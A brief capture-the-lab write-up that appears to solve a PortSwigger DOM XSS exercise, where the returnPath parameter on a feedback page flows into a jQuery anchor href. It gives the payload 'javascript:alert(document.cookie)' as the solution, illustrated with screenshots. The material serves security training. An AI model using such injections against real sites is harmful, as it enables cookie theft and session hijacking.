## DOM XSS in jQuery anchor href attribute sink using location.search source

<img width="922" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/8c36534a-baa7-4066-83db-373739e9d603">


## Solution:

Clicking on the Submit feedback link on the main page of the blog leads to the path /feedback?returnPath=/.

<img width="720" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/27341d84-e556-4323-896b-4995c4140442">

payload to trigger an alert!

``javascript:alert(document.cookie)``

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a4e933d0-788a-47e4-b45b-bc6cbd1c8c20">
